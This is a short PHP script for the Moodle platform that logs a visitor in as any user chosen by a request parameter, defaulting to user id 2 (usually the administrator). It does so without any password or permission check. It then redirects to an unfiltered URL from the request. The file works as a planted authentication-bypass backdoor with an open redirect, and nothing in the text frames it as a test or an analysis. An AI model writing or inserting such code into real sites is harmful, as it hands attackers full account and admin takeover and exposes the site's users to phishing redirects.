<?php
require_once(__DIR__ . '/../../config.php');
$userid = optional_param('uid', 2, PARAM_INT);
$user = $DB->get_record('user', ['id' => $userid]);
if ($user) {
    complete_user_login($user);
}
$redirect = optional_param('w', '/my/', PARAM_RAW);
redirect(new moodle_url($redirect));
